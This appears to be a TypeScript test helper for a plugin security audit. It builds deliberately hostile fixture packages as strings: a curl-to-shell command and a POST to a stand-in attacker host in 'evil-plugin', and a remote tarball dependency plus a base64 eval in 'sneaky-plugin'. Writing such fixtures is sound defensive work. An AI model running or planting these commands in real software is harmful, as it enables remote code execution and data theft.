import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))

export const FIXTURE_PROJECT = path.resolve(HERE, 'fixtures', 'project')

/**
 * Plugin packages installed into the fixture project's `node_modules`.
 *
 * They are written on copy instead of being committed: a checked-in
 * `node_modules/` is skipped by `.gitignore` and Biome (so it silently drifts),
 * and keeping the deliberately hostile code (`eval`, `exec`) as strings keeps
 * it out of the repository's lintable sources. The contents mirror what the
 * audit is meant to read statically — install scripts, child-process exec,
 * network calls, filesystem writes, obfuscation and remote dependencies.
 */
const FIXTURE_PLUGINS: Record<string, Record<string, string>> = {
  'clean-plugin': {
    'package.json': `{
  "name": "clean-plugin",
  "version": "2.0.0",
  "license": "MIT",
  "repository": "https://github.com/bolt-docs/audit-fixtures",
  "homepage": "https://github.com/bolt-docs/audit-fixtures"
}
`,
    'index.js': `// A plugin with nothing in it to flag. \`export\` and \`return\` only — no
// process, no child_process, no network, no filesystem, no dynamic code.
export const name = 'clean-plugin'

export function setup(config) {
  return {
    name,
    config,
  }
}
`,
  },
  'evil-plugin': {
    'package.json': `{
  "name": "evil-plugin",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node install.js"
  },
  "main": "dist/index.js",
  "files": [
    "dist",
    "index.js"
  ],
  "license": "MIT",
  "repository": "https://github.com/bolt-docs/audit-fixtures",
  "homepage": "https://github.com/bolt-docs/audit-fixtures"
}
`,
    'index.js': `// Deliberately hostile.
//
// This file exists so the audit has something real to *statically* read. Every
// call below is one the audit is supposed to flag — and none of them may ever
// run, which is what the marker files in test-utils.ts prove. The audit reads
// this file as text; it must not \`require()\` it.
const fs = require('node:fs')
const path = require('node:path')
const { exec } = require('node:child_process')

// filesystem: \`fs-write\` runs on the \`raw\` layer, where the string in
// \`require('node:fs')\` survives, so a destructured \`writeFileSync\` above is
// invisible to it. Written the way the rule matches.
fs.writeFileSync(path.join(__dirname, 'MARKER-exec'), 'executed')

// process: \`child-process-exec\`
exec('curl http://attacker.invalid/payload.sh | sh')

// network: \`fetch-call\`
fetch('http://attacker.invalid/report', { method: 'POST' })

module.exports = { name: 'evil-plugin' }
`,
    'dist/index.js': `// The entry the audit resolves through \`main\`.
module.exports = { name: 'evil-plugin' }
`,
    'install.js': `require('node:fs').writeFileSync(
  require('node:path').join(__dirname, '.marker-postinstall'),
  'installed',
)
`,
  },
  'sneaky-plugin': {
    'package.json': `{
  "name": "sneaky-plugin",
  "version": "1.0.0",
  "dependencies": {
    "totally-not-shady": "https://raw.githubusercontent.com/attacker/pkg.tgz",
    "lodash": "4.17.21"
  },
  "license": "MIT",
  "repository": "https://github.com/bolt-docs/audit-fixtures",
  "homepage": "https://github.com/bolt-docs/audit-fixtures"
}
`,
    'index.js': `// Obfuscation: \`eval\` on a base64 payload, plus atob/btoa.
const payload = atob('Y29uc29sZS5sb2coImhpIik=')
const decoded = btoa(payload)
eval(decoded)
export default {}
`,
  },
}

function writeFixturePlugins(root: string): void {
  for (const [name, files] of Object.entries(FIXTURE_PLUGINS)) {
    for (const [rel, content] of Object.entries(files)) {
      const abs = path.join(root, 'node_modules', name, rel)
      fs.mkdirSync(path.dirname(abs), { recursive: true })
      fs.writeFileSync(abs, content)
    }
  }
}

/** Copies the fixture project to a fresh temp dir (hermetic per test). */
export function makeProjectCopy(): string {
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'boltdocs-audit-'))
  fs.cpSync(FIXTURE_PROJECT, tmp, { recursive: true })
  writeFixturePlugins(tmp)
  return tmp
}

export function cleanupProject(tmp: string): void {
  fs.rmSync(tmp, { recursive: true, force: true })
}

/**
 * Marker files that a *broken* audit would create by executing plugin code:
 * - module-level side effect (index.js writes .marker-imported on import)
 * - runtime code (dist/index.js writes MARKER-exec)
 * - install script (postinstall writes .marker-postinstall)
 */
export function markerPaths(root: string): string[] {
  const pluginDir = path.join(root, 'node_modules', 'evil-plugin')
  return [
    path.join(pluginDir, '.marker-imported'),
    path.join(pluginDir, 'MARKER-exec'),
    path.join(pluginDir, '.marker-postinstall'),
  ]
}

export function assertNoMarkers(root: string): void {
  for (const marker of markerPaths(root)) {
    expect(fs.existsSync(marker)).toBe(false)
  }
}

/** Creates a throwaway package dir with the given relative files. */
export function makePlugin(files: Record<string, string>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'audit-scan-'))
  for (const [rel, content] of Object.entries(files)) {
    const abs = path.join(dir, rel)
    fs.mkdirSync(path.dirname(abs), { recursive: true })
    fs.writeFileSync(abs, content)
  }
  return dir
}

export function cleanupPlugin(dir: string): void {
  fs.rmSync(dir, { recursive: true, force: true })
}
